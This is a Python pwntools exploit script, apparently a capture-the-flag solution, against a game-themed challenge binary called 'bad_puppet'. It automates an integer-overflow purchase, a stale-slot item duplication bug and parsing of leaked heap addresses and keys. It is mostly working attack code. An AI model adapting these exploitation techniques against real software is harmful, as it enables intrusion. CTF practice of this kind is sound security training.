from pwn import *
import time, re, sys

class Game:
    def __init__(self, use_remote=False, host=None, port=None, env=None):
        context.log_level = "error"
        if use_remote:
            self.io = remote(host, port, timeout=12)
        else:
            e = {"MALLOC_ARENA_MAX": "1"}
            if env: e.update(env)
            self.io = process(["./bad_puppet", "--stdio"],
                              cwd="/home/ubuntu/pwn/bp/bad_puppet", env=e)
        self.dead = False
        self.buf = b""
        time.sleep(0.5)
        self.drain(0.6)

    def _recv(self, t):
        try:
            return self.io.recv(65536, timeout=t)
        except EOFError:
            self.dead = True
            return b""
        except Exception:
            return b""

    def drain(self, t=0.15):
        end = time.time() + t
        out = b""
        while time.time() < end:
            d = self._recv(0.03)
            if d:
                out += d
        self.buf += out
        return out

    def cmd(self, s, t=0.12, echo=False):
        if isinstance(s, str): s = s.encode()
        try: self.io.sendline(s)
        except Exception:
            self.dead = True
            return b""
        o = self.drain(t)
        if echo:
            sys.__stdout__.write("### %s\n%s\n" % (s.decode(errors="replace"), o.decode(errors="replace")))
            sys.__stdout__.flush()
        return o

    def raw(self, b, t=0.12):
        self.buf = b""
        try: self.io.send(b)
        except Exception:
            self.dead = True
            return b""
        return self.drain(t)

    def text(self): return self.buf.decode(errors="replace")

    def inv(self):
        self.buf = b""
        self.cmd("inv list", 0.22)
        txt = self.text()
        items = []
        for line in txt.splitlines():
            m = re.match(r"\[\*\]   \[(\d+)\] #(\d+) (.*?) \| type=(\w[\w ]*?) \| (.*)$", line)
            if not m: continue
            items.append(dict(idx=int(m.group(1)), id=int(m.group(2)), name=m.group(3),
                              type=m.group(4), equipped=1 if "equipped=1" in m.group(5) else 0,
                              count=int(re.search(r"count=(\d+)", m.group(5)).group(1)) if "count=" in m.group(5) else 1))
        return items

    def world(self):
        self.buf = b""
        self.cmd("mw show", 0.22)
        txt = self.text()
        eqs, drops = [], []
        mode = None
        for line in txt.splitlines():
            if line.startswith("[*] Equipped: empty"): mode=None; continue
            if line.startswith("[*] Drops: empty"): mode=None; continue
            if line.startswith("[*] Equipped:"): mode="eq"; continue
            if line.startswith("[*] Drops:"): mode="dp"; continue
            m = re.match(r"\[\*\]   \[(\d+)\] (.*)$", line)
            if not m or mode is None: continue
            idx=int(m.group(1)); body=m.group(2)
            if mode=="eq":
                mm = re.search(r"description_addr=(\w+) description_head=(\w+) description_key=(\w+)", body)
                eqs.append(dict(idx=idx, body=body, addr=int(mm.group(1),16) if mm else None,
                                head=int(mm.group(2),16) if mm else None, key=int(mm.group(3),16) if mm else None))
            else:
                drops.append(dict(idx=idx, body=body, is_ring=("type=Ring" in body)))
        return eqs, drops

    # ---------- phases ----------
    def game_setup(self):
        g = self
        g.cmd("shop buy 3 4227858432", 0.4)      # 4.2B bombs for 0 rupees (u32 mult overflow)
        g.cmd("map teleport castle", 0.3)
        g.cmd("battle", 0.3)
        g.cmd("use item", 0.3)
        g.cmd("1", 0.3)
        g.cmd("32", 0.4)                          # one-shot Ganondorf
        g.cmd("mw pickup 0", 0.4)                 # ring to inventory
        g.cmd("shop sell 1", 0.4)                 # sell bomb stack -> huge rupees
        g.cmd("shop buy 0 10", 0.6)               # 10 traveler's swords (sacrificial)
        g.cmd("shop buy 1 10", 0.6)               # 10 broadswords

    def dup_ring(self):
        """stale drop slot dup: drop a non-ring whose mirror after reversal is a ring."""
        g = self
        items = g.inv()
        n = len(items)
        ringidx = {it["idx"] for it in items if it["type"] == "Ring"}
        cand = None
        for it in items:
            i = it["idx"]
            if it["type"] == "Ring": continue
            if (n - 1 - i) in ringidx: cand = i
        if cand is None: return None
        g.buf = b""
        g.raw(("inv drop %d\ninv sort\n" % cand).encode(), 0.7)
        t = g.text()
        if "stale drop slot" not in t: return None
        eqs, drops = g.world()
        ridx = [d["idx"] for d in drops if d["is_ring"]]
        if not ridx: return None
        g.cmd("mw pickup %d" % ridx[0], 0.45)
        return cand

    def dup_n(self, n):
        for k in range(n):
            if self.dup_ring() is None:
                return k
        return n

    def equip_sell(self):
        """equip first ring then sell it; returns dest body info"""
        items = self.inv()
        rings = [it for it in items if it["type"] == "Ring"]
        if not rings: return None
        r0 = rings[0]
        self.cmd("inv equip %d" % r0["idx"], 0.26)
        self.cmd("shop sell %d" % r0["idx"], 0.26)
        return r0
